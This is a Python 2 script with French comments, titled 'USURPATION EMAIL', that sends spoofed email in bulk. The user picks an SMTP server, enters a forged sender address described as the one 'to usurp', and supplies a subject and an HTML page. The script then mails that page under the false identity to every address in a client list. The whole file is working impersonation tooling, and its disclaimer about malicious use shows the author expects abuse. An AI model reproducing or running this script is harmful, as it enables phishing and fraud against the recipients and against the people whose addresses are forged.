#!/usr/bin/python
#-*-coding:UTF-8-*-

# IMPORTATION DES MODULES

import os
import smtplib
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEImage import MIMEImage
from email import encoders
import mimetypes, posixpath
from email import Utils

# DECLARATION DES VARIABLES

liste_smtp = []
destinataire = ""
expediteur = ""
sujet = ""
#date = ""
#message = ""
serveur = ""
fichierHTML = ""
fichier = ""

# RECUPERATION DES INFORMATIONS

def setInformations():
	# LECTURE DU FICHIER CONTENANT LES SERVEURS SMTP
	with open("smtp.txt", "r") as srvsmtp:
		for smtp in srvsmtp:
			# CREATION DE LISTE SMTP
			liste_smtp.append(smtp.replace("\r\n",""))	

		for i in range (0,len(liste_smtp)):
			print str(i) + "	" + liste_smtp[i]

		#INTERACTION AVEC L'UTILISATEUR
		num_smtp = raw_input ("\n\n-> Choix du serveur SMTP : ")

		serveur = liste_smtp[int(num_smtp)]

		print "\nServeur SMTP choisi : " + serveur + "\n"

	expediteur = raw_input("-> Adresse e-mail a usurper : ")
	sujet = raw_input("-> Sujet : ")
	#message = raw_input("-> Message : ")
	#date = raw_input("-> Date : ")
	return serveur, expediteur, sujet #message, date


print "	##################################################"
print "	##						##"
print "	##		USURPATION EMAIL 		##"
print "	##						##"
print "	##################################################\n\n"

print "ATTENTION : L'utilisation de ce script a des fin malveillantes engage votre entière responsabilité."
print "Je ne suis en aucun cas responsable des dommages causés par ce script.\n"
print "PRÉREQUIS : Merci d'éditer le fichier 'liste_client.txt' avant l'utilisation de ce script !! \n\n"

infos = setInformations()
fichierHTML = open(raw_input("-> Chemin de la page HTML : "), "r").read()

with open('liste_clients.txt') as clients:
	for email in clients:

		# FORMATTAGE DU MAIL
		mail = MIMEMultipart()
		mail.set_charset("utf-8")
		mail['From'] = infos[1]
		mail['Subject'] = infos[2]
		mail['To'] = email
		mail['Content-Type'] = "text/html; charset=utf-8"

		emailtext = MIMEText(fichierHTML, 'html')

		emailtext.set_charset('utf-8')

		mail.attach(emailtext)

		# CONFIGURATION DU SMTP
		serv = smtplib.SMTP(infos[0])
		print "Configuration du serveur smtp : OK!"
	
		# ENVOI DU MAIL ANONYME
		serv.sendmail(infos[1], email, mail.as_string())
		print "Le message est envoyé a " + email

		serv.quit()

##################################
##	SCRIPT REALISE PAR FRAX2602	##
##################################
